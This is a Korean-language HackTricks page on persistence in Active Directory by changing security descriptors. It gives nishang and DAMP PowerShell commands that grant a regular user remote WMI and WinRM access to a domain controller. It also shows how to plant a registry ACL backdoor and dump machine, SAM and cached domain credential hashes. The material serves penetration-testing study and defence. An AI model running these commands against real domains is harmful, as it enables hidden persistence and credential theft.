# 보안 설명자

{{#include ../../banners/hacktricks-training.md}}

## 보안 설명자

[문서에서](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL)은 보안 설명자를 설명하는 데 사용되는 형식을 정의합니다. SDDL은 DACL 및 SACL에 ACE 문자열을 사용합니다: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

**보안 설명자**는 **객체**가 다른 **객체에 대해** 가지는 **권한**을 **저장**하는 데 사용됩니다. 객체의 **보안 설명자**를 **약간만 변경**할 수 있다면, 권한이 있는 그룹의 구성원이 되지 않고도 해당 객체에 대해 매우 흥미로운 권한을 얻을 수 있습니다.

따라서 이 persistence technique은 특정 객체에 대해 필요한 모든 권한을 획득하여, 일반적으로 admin privileges가 필요한 작업을 admin이 되지 않고 수행할 수 있는 능력을 기반으로 합니다.

### WMI에 대한 액세스

다음을 [**사용하여**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup> 사용자가 **원격으로 WMI를 실행**할 수 있는 액세스 권한을 부여할 수 있습니다:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### WinRM 액세스

[**이 방법을 사용하여**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1) **사용자에게 winrm PS 콘솔 액세스 권한을 부여합니다**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### hashes에 대한 Remote access

**DAMP**를 사용하여 **Reg backdoor를 생성해** **registry**에 접근하고 **hashes를 dump**하면, 언제든지 **computer의 hash**, **SAM** 및 computer에 저장된 모든 **cached AD** credential을 가져올 수 있습니다. 따라서 **Domain Controller computer**에 대한 이 permission을 **regular user**에게 부여하는 것은 매우 유용합니다:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Check [**Silver Tickets**](silver-ticket.md)에서 Domain Controller의 computer account hash를 어떻게 사용할 수 있는지 알아보세요.

## 참고 자료

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
